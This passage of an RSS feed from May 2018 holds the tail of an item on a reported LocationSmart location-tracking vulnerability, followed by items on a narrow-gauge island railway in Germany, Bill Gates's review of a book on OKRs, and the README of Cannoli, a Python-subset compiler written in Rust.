<og:title>LocationSmart API Vulnerability</og:title>
<og:url>https://www.robertxiao.ca/hacking/locationsmart/</og:url>
<og:description>On May 16th, I found a vulnerability in the LocationSmart website which allowed anyone, with no prior authentication or consent, to obtain the realtime location of any cellphone in the US to within…</og:description>
<og:image>https://www.robertxiao.ca/wp-content/uploads/IMG_Gothic_20180517_173338_processed-1.jpg</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.robertxiao.ca/hacking/locationsmart/</dc:identifier>
</item>
<item>
<title>Tiny Trains: Neat Narrow-Gauge Rail Connects German Island to Mainland</title>
<link>https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/</link>
<guid isPermaLink="true" >https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/</guid>
<description>&lt;p&gt;&lt;a href=&quot;https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/#&quot; data-featherlight=&quot;https://weburbanist.com/wp-content/uploads/2018/04/tinytrains.gif&quot;&gt;&lt;img class=&quot;first-image img-responsive&quot; src=&quot;https://weburbanist.com/wp-content/uploads/2018/04/tinytrains.gif&quot; alt=&quot;&quot; width=&quot;644&quot; height=&quot;319&quot;/&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The island of Nordstrandischmoor is connected to mainland Germany by a tiny narrow gauge railway, on which residents (at least those 15 years of age and older and holding a moped license) can drive private trains back and forth to and from Lüttmoorsiel. Each island house has its own wagon — some used to be wind-powered, using sails, but today they run on diesel.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/#&quot; data-featherlight=&quot;https://weburbanist.com/wp-content/uploads/2018/04/mini-train-960x720.jpg&quot;&gt;&lt;img class=&quot;alignnone size-wide644 wp-image-112870&quot; src=&quot;https://weburbanist.com/wp-content/uploads/2018/04/mini-train-644x483.jpg&quot; alt=&quot;&quot; width=&quot;644&quot; height=&quot;483&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Often called simply the Lorenbahn, this slim rail line reaches out over a third of a mile to bridge the island to the shore, and is sometimes closed due to extreme winds or other weather-related risks. On either shore, the line branches out to a series of local destinations. some of the trains are enclosed, but others are open-air, like conventional convertible cars but on rails.&lt;/p&gt;
&lt;div class=&quot;video-box&quot;&gt;&lt;iframe type=&quot;text/html&quot; src=&quot;https://www.youtube.com/embed/DULlPrOOtuc?rel=0&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/div&gt;
&lt;p&gt;The original line was constructed to ferry out building materials for coastal defense, then destroyed by ice flows, only to be rebuilt in a more durable fashion.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/#&quot; data-featherlight=&quot;https://weburbanist.com/wp-content/uploads/2018/04/island-station-960x1280.jpg&quot;&gt;&lt;img class=&quot;alignnone size-wide644 wp-image-112871&quot; src=&quot;https://weburbanist.com/wp-content/uploads/2018/04/island-station-644x859.jpg&quot; alt=&quot;&quot; width=&quot;644&quot; height=&quot;859&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Some of the rail vehicles belong to the State Department for Coastal Defence and National Parks. There are two locomotives and two construction wagons (Bauwagen, which provide shelter for the workers during construction work, as well as goods wagons for construction work.&lt;/p&gt;
&lt;div class=&quot;video-box&quot;&gt;&lt;iframe type=&quot;text/html&quot; src=&quot;https://www.youtube.com/embed/Qld0d_YBoro?rel=0&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/div&gt;
&lt;p&gt;Other narrow-gauge trains can be found around the world as well, often serving similarly small communities or other niche design functions.&lt;/p&gt;
&lt;div class=&quot;video-box&quot;&gt;&lt;iframe type=&quot;text/html&quot; src=&quot;https://www.youtube.com/embed/oDvHzyhferg?rel=0&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/div&gt;
</description>
<pubDate>Thu, 17 May 2018 18:00:43 +0000</pubDate>
<dc:creator>misnamed</dc:creator>
<og:type>article</og:type>
<og:title>Tiny Trains: Neat Narrow-Gauge Rail Connects German Island to Mainland</og:title>
<og:url>https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/</og:url>
<og:description>The island of Nordstrandischmoor is connected to mainland Germany by a tiny narrow gauge railway, on which residents (at least those 15 years of age and older and holding a moped license) can drive…</og:description>
<og:image>https://weburbanist.com/wp-content/uploads/2018/04/tinytrains.gif</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://weburbanist.com/2018/05/08/tiny-trains-neat-narrow-gauge-rail-connects-german-island-to-mainland/</dc:identifier>
</item>
<item>
<title>Book recommendation: Measure what matters</title>
<link>https://www.gatesnotes.com/Books/Measure-What-Matters?WT.mc_id=20180516172000_MeasureWhatMatters_BG-LI&amp;WT.tsrc=BGLI&amp;linkId=51788990</link>
<guid isPermaLink="true" >https://www.gatesnotes.com/Books/Measure-What-Matters?WT.mc_id=20180516172000_MeasureWhatMatters_BG-LI&amp;WT.tsrc=BGLI&amp;linkId=51788990</guid>
<description>&lt;div id=&quot;content_0_articlePanel&quot; readability=&quot;175.92081065866&quot;&gt;
&lt;p&gt;In the early days of Microsoft, I felt pretty confident about my coding skills, but I had a lot to learn about project management. This became abundantly clear after an incident in 1978, when I told Intel—a really important customer—that we would deliver them a version of Microsoft BASIC in four weeks. They thought I was crazy to promise it that fast, and it turned out that they were right. We were two weeks late.&lt;/p&gt;
&lt;p&gt;As it happens, Intel employed someone who would end up helping me improve my management skills: Andy Grove. A precise, hard-driving guy, Andy oversaw their strategy and operations, and he championed the idea of management by objective. Andy and I became friendly over the years, I studied several of the business books he wrote early on, and Microsoft adopted some of the methods that Intel used. I consider Andy one of the great business leaders of the 20&lt;sup&gt;th&lt;/sup&gt; century.&lt;/p&gt;
&lt;p&gt;Andy’s ideas are a basis for the management system called OKRs (Objectives and Key Results) developed by John Doerr, a venture capitalist and a frequent business partner of mine. In his new book, &lt;a href=&quot;https://www.penguinrandomhouse.com/books/546304/measure-what-matters-by-john-doerr-foreword-by-larry-page/9780525536222/&quot; target=&quot;_blank&quot;&gt;&lt;em&gt;Measure What Matters: How Google, Bono, and the Gates Foundation Rock the World With OKRs&lt;/em&gt;&lt;/a&gt;, John explains how OKRs work and shows how you can apply them in all sorts of situations.&lt;/p&gt;
&lt;p&gt;I’d recommend John’s book for anyone interested in becoming a better manager (and I’d say that even if I hadn’t been interviewed for a super-nice chapter about the Gates Foundation). In the excerpt below, John tells the inside story of how Andy inspired the idea of OKRs.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Excerpt from&lt;/strong&gt; &lt;strong&gt;&lt;em&gt;Measure What Matters&lt;/em&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;By John Doerr&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Intel was Grove’s laboratory for management innovation. He loved to teach, and the company reaped the benefits. A few days after getting hired, I received a coveted invitation to Intel’s Organization, Philosophy, and Economics course, known as iOPEC, a seminar on Intel strategy and operations. Resident professor: Dr. Andy Grove.&lt;/p&gt;
&lt;p&gt;In the space of an hour, Grove traced the company’s history, year by year. He summarized Intel’s core pursuits: a profit margin twice the industry norm, market leadership in any product line it entered, the creation of “challenging jobs” and “growth opportunities” for employees. Fair enough, I thought, though I’d heard similar things at business school.&lt;/p&gt;
&lt;p&gt;Then he said something that left a lasting impression on me.&lt;span&gt; &lt;/span&gt;He referenced his previous company, Fairchild, where he’d first met Robert Noyce and Gordon Moore and went on to blaze a trail in silicon wafer research. Fairchild was the industry’s gold standard, but it had one great flaw: a lack of “achievement orientation.”&lt;/p&gt;
&lt;p&gt;“Expertise was very much valued there,” Andy explained. “That is why people got hired. That’s why people got promoted. Their effectiveness at translating that knowledge into actual results was kind of shrugged off.” At Intel, he went on, “we tend to be exactly the opposite. It almost doesn’t matter what you know. It’s what you can do with whatever you know or can acquire and actually accomplish [that] tends to be valued here.” Hence the company’s slogan: “Intel delivers.”&lt;/p&gt;
&lt;p&gt;&lt;em&gt;It almost doesn’t matter what you know&lt;/em&gt;… To claim that knowledge was secondary and execution all-important—well, I wouldn’t learn &lt;em&gt;that&lt;/em&gt; at Harvard. I found the proposition thrilling, a real-world affirmation of accomplishment over credentials. But Grove wasn’t finished, and he had saved the best for last. Over a few closing minutes, he outlined a system he’d begun to install in 1971, when Intel was three years old.&lt;span&gt; &lt;/span&gt;It was my first exposure to the art of formal goal setting. I was mesmerized.&lt;/p&gt;
&lt;p&gt;A few unvarnished excerpts, straight from the father of OKRs:&lt;/p&gt;
&lt;p&gt;Now, the two key phrases…are objectives and the key result. And they match the two purposes. The objective is the direction: “We want to dominate the mid-range microcomputer component business.” That’s an objective. That’s where we’re going to go. Key results for this quarter: “Win ten new designs for the 8085” is one key result. It’s a milestone. The two are not the same…&lt;/p&gt;

&lt;p&gt;The key result has to be measurable. But at the end you can look, and without any arguments: Did I do that or did I not do it? Yes? No? Simple. No judgments in it.&lt;/p&gt;

&lt;p&gt;Now, did we dominate the mid-range microcomputer business? That’s for us to argue in the years to come, but over the next quarter we’ll know whether we’ve won ten new designs or not.&lt;/p&gt;
&lt;p&gt;It was a “very, very simple system,” Grove said, knowing simplicity was catnip to an audience of engineers. On its face, the conception seemed logical, commonsensical—and inspiring. Against the stale management orthodoxy of the period, Grove had created something fresh and original. Strictly speaking, however, his “objectives and key results” did not spring from the void. The process had a precursor. In finding his way, Grove had followed the trail of a legendary, Vienna-born gadfly, the first great “modern” business management thinker: Peter Drucker.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Excerpted from &lt;/em&gt;&lt;a href=&quot;https://www.penguinrandomhouse.com/books/546304/measure-what-matters-by-john-doerr-foreword-by-larry-page/9780525536222/&quot; target=&quot;_blank&quot;&gt;&lt;strong&gt;&lt;em&gt;Measure What Matters: How Google, Bono and the Gates Foundation Rock the Work with OKRs&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;&lt;em&gt; by John Doerr, in agreement with Portfolio, an imprint of Penguin Publishing Group, a division of Penguin Random House LLC. Copyright © 2018 by Bennet Group LLC.&lt;/em&gt;&lt;/p&gt;
&lt;div id=&quot;PrevNextTabsHolder&quot; class=&quot;PrevNextTabsHolder&quot;&gt;
&lt;div id=&quot;PrevNextTabs_PrevTab&quot;&gt;

&lt;p&gt;Previous Article&lt;/p&gt;
&lt;/div&gt;

&lt;div id=&quot;PrevNextTabs_NextTab&quot;&gt;
&lt;p&gt;Next Article&lt;/p&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div id=&quot;content_0_articlePrevNextCont&quot; readability=&quot;57&quot;&gt; 
&lt;p&gt;NEXT&lt;br/&gt;&lt;span class=&quot;nextPrevText&quot;&gt;This school proves that universities can be bigger and better&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;</description>
<pubDate>Thu, 17 May 2018 16:58:24 +0000</pubDate>
<dc:creator>seshagiric</dc:creator>
<og:description>Bill Gates reviews &quot;Measure What Matters: How Google, Bono, and the Gates Foundation Rock the World With OKRs&quot; by John Doerr</og:description>
<og:image>https://www.gatesnotes.com/-/media/Images/Books/Measure-What-Matters/measure-what-matters_2018_article-hero_1200px_v5.jpg</og:image>
<og:title>Management tips from a brilliant business leader</og:title>
<og:type>article</og:type>
<og:url>https://www.gatesnotes.com/Books/Measure-What-Matters</og:url>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.gatesnotes.com/Books/Measure-What-Matters?WT.mc_id=20180516172000_MeasureWhatMatters_BG-LI&amp;WT.tsrc=BGLI&amp;linkId=51788990</dc:identifier>
</item>
<item>
<title>Show HN: Cannoli – A compiler for a subset of Python written in Rust</title>
<link>https://github.com/joncatanio/cannoli</link>
<guid isPermaLink="true" >https://github.com/joncatanio/cannoli</guid>
<description>&lt;h3&gt;README.md&lt;/h3&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;
&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/joncatanio/cannoli/blob/master/resources/logo/cannoli_logo_212x118.png&quot;&gt;&lt;img src=&quot;https://github.com/joncatanio/cannoli/raw/master/resources/logo/cannoli_logo_212x118.png&quot; alt=&quot;&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Cannoli is a compiler for a subset of Python 3.6.5 and is designed to evaluate the language features of Python that negatively impact performance. Cannoli is written in &lt;a href=&quot;https://www.rust-lang.org/&quot; rel=&quot;nofollow&quot;&gt;Rust&lt;/a&gt; and also compiles Python to Rust. The use of Rust as the intermediate representation was chosen for performance purposes and to avoid writing a garbage collector. Cannoli was developed as work for a Master's Thesis as &lt;a href=&quot;https://www.calpoly.edu/&quot; rel=&quot;nofollow&quot;&gt;Cal Poly - San Luis Obispo&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Python Support&lt;/h3&gt;
&lt;p&gt;Cannoli supports a subset of Python 3.6.5, it's current state omits many features that could not be completed during the duration of the thesis. The main omissions are exceptions and inheritance. Standard library support is also incomplete but covers numerous proofs-of-concepts that could be applied to other types and modules (see &lt;a href=&quot;https://github.com/joncatanio/cannoli#cannolib&quot;&gt;Cannolib&lt;/a&gt;).&lt;/p&gt;
&lt;h3&gt;Optimizations&lt;/h3&gt;
&lt;p&gt;Cannoli supports two major optimizations that come as a result of applying restrictions to the language. Restrictions are placed on the Python features that provide the ability to delete or inject scope elements and the ability to mutate the structure of objects and classes at run time. The corresponding feature branches are &lt;a href=&quot;https://github.com/joncatanio/cannoli/tree/scope-opts&quot;&gt;&lt;code&gt;scope-opts&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://github.com/joncatanio/cannoli/tree/class-opts&quot;&gt;&lt;code&gt;class-opts&lt;/code&gt;&lt;/a&gt;. The optimizations are built on top of each other, therefore the &lt;code&gt;class-opts&lt;/code&gt; branch is a superset of the &lt;code&gt;scope-opts&lt;/code&gt; branch. In general, the &lt;code&gt;class-opts&lt;/code&gt; branch yields a performance increase of over 50% from the &lt;code&gt;master&lt;/code&gt; branch.&lt;/p&gt;
&lt;h3&gt;Thesis Paper&lt;/h3&gt;
&lt;p&gt;More information on the results and implementation details of Cannoli can be found in the thesis paper.&lt;/p&gt;
&lt;p&gt;👉 &lt;em&gt;&lt;a href=&quot;https://github.com/joncatanio/cannoli/blob/master/resources/papers/cannoli-thesis-paper.pdf&quot;&gt;Leave the Features: Take the Cannoli&lt;/a&gt;&lt;/em&gt; - Jonathan Catanio&lt;/p&gt;
&lt;h3&gt;How to Run&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Install Rust by following the instructions on their official &lt;a href=&quot;https://www.rust-lang.org/en-US/install.html&quot; rel=&quot;nofollow&quot;&gt;installation guide&lt;/a&gt;. Cannoli is both compiled with Rust 1.24.0 and outputs Rust 1.24.0 code. Changing versions with the Rust toolchain can be done with the &lt;code&gt;rustup&lt;/code&gt; utility.&lt;/li&gt;
&lt;li&gt;Build the project by running &lt;code&gt;cargo build&lt;/code&gt; or &lt;code&gt;cargo build --release&lt;/code&gt; in the project's root directory. This will create a &lt;code&gt;target&lt;/code&gt; directory with &lt;code&gt;debug&lt;/code&gt; or &lt;code&gt;release&lt;/code&gt; subdirectories containing the executable.&lt;/li&gt;
&lt;li&gt;Compile a Python file by executing the command &lt;code&gt;./target/release/cannoli [src.py]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Executing the Compiled Python&lt;/h3&gt;
&lt;p&gt;Compiling with Cannoli outputs a &lt;code&gt;main.rs&lt;/code&gt; file that can be used in a standalone Rust crate. Ideally the Cannoli compiler would utilize &lt;code&gt;rustc&lt;/code&gt; to output a binary but this wasn't done. The steps on how to run this compiled file are as follows:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Create a new crate with the command &lt;code&gt;cargo new --bin sandbox&lt;/code&gt;. Where &lt;code&gt;sandbox&lt;/code&gt; is the name of the crate.&lt;/li&gt;
&lt;li&gt;Move the &lt;code&gt;main.rs&lt;/code&gt; file into the new crate's &lt;code&gt;src&lt;/code&gt; directory.&lt;/li&gt;
&lt;li&gt;Update the &lt;code&gt;Cargo.toml&lt;/code&gt; file to include &lt;code&gt;cannolib&lt;/code&gt; as a dependency, this is Cannoli's standard library. This can be done by linking to a git repository or to a relative crate.&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;[dependencies]
cannolib = { git = 'https://github.com/joncatanio/cannolib', branch = 'master' }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Would include the master branch of the Cannolib git repo in the crate.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;To add debugging and all optimizations to release mode, also include these lines in the &lt;code&gt;Cargo.toml&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;[profile.release]
debug = true
codegen-units = 1
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;Finally, build the project from the crate's root directory with &lt;code&gt;cargo build --release&lt;/code&gt; and run the executable with the command &lt;code&gt;./target/release/sandbox&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Cannolib&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/joncatanio/cannolib&quot;&gt;Cannolib&lt;/a&gt; provides library support for Cannoli, including a number of types and modules that offload work that would have otherwise been done by the Cannoli compiler. Cannolib provides the implementation of the overall type system as well as built-in functions similar to those defined in the &lt;a href=&quot;https://docs.python.org/3/library/functions.html#built-in-functions&quot; rel=&quot;nofollow&quot;&gt;Python library&lt;/a&gt;.&lt;/p&gt;
&lt;/article&gt;</description>
<pubDate>Thu, 17 May 2018 16:55:08 +0000</pubDate>
<dc:creator>joncatanio</dc:creator>
<og:image>https://avatars0.githubusercontent.com/u/13863008?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>joncatanio/cannoli</og:title>
<og:url>https://github.com/joncatanio/cannoli</og:url>
<og:description>cannoli - Cannoli Programming Language</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/joncatanio/cannoli</dc:identifier>
</item>
</channel>
</rss>